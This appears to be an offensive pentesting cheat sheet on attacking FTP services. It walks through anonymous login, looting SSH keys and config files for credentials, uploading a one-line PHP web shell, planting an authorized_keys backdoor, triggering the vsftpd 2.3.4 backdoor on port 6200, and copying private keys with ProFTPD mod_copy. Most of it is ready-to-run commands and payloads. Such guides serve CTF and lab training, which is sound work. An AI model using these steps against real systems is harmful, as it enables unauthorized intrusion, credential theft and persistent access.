## 1. The Handshake & Environment

First, confirm the access. Use `anonymous` as the username and literally anything (or nothing) as the password.

```bash
ftp <IP>
# Name: anonymous
# Password: 
```

### Passive vs. Active Mode

If you can log in but `ls` hangs, it’s a firewall/NAT issue. Switch to **Passive Mode**:

```bash
ftp> passive
# Passive mode: on
```

---
## 2. Information Disclosure (The "Looting" Phase)

Most admins don't realize that "Anonymous" doesn't mean "Empty." You are looking for configuration files, backup scripts, or hidden directories.

* **Recursive Listing**: Don't just check the root.
```bash
ftp> ls -R
```


* **The Binary Trap**: **CRITICAL.** By default, FTP often transfers in ASCII mode. If you download a private key, a binary, or a database file in ASCII, it will be corrupted and useless. Always switch to binary:
```bash
ftp> type binary
```

### High-Value Targets:

* **`.ssh/id_rsa`**: If you find this, you have an instant SSH login.
* **`web.config`, `settings.py`, `config.php**`: These contain database credentials or API keys.
* **`.bash_history`**: May contain cleartext passwords typed during command-line operations.

---
## 3. Write Access = RCE (The "Foothold" Phase)

If the FTP directory overlaps with a web server directory (e.g., `/var/www/html`), and you have write permissions, you have won.

### Step A: Test for Write Access

```bash
ftp> put test.txt
```

If the server says `226 Transfer complete`, you can upload a shell.

### Step B: The Web Shell Pivot

If the target is running PHP, upload a simple command execution script:

```php
<?php system($_GET['cmd']); ?>
```

Then trigger it via your browser: `http://target.com/shell.php?cmd=whoami`.

### Step C: The `.ssh` Backdoor

If you have write access to a user's home directory but **not** a web root, check for a `.ssh` folder.

1. Generate an SSH key on your machine: `ssh-keygen -t rsa`.
2. Upload your **public** key (`id_rsa.pub`) to the FTP server as `authorized_keys`:
```bash
ftp> cd .ssh
ftp> put id_rsa.pub authorized_keys

```

3. Log in via SSH without a password: `ssh -i id_rsa user@target`.
---
## 4. Exploiting the Service Itself

Sometimes the "backdoor" isn't in the files, but in the software version.

### vsFTpd 2.3.4 (The "Smiley" Backdoor)

This version contains a famous backdoor. If you log in with a username that ends in `:)`, the server opens a shell on port **6200**.

```bash
# Attacker Terminal 1
ftp <IP>
Name: user:)
Password: any

# Attacker Terminal 2
nc -nv <IP> 6200
```

### ProFTPD 1.3.5 (mod_copy)

This module allows an unauthenticated user to copy files from one part of the filesystem to another.

* **Scenario**: You found a private key in `/home/william/.ssh/id_rsa` but you can't read it via FTP.
* **Abuse**: Use `CPFR` (Copy From) and `CPTO` (Copy To) to move that key into the `/var/www/html` folder where you *can* download it via HTTP.

```bash
nc <IP> 21
CPFR /home/william/.ssh/id_rsa
CPTO /var/www/html/id_rsa.txt
```

---
## 5. Automation

Use `nmap` scripts to quickly find common FTP flaws without manual poking:

```bash
nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 -p 21 <IP>

```
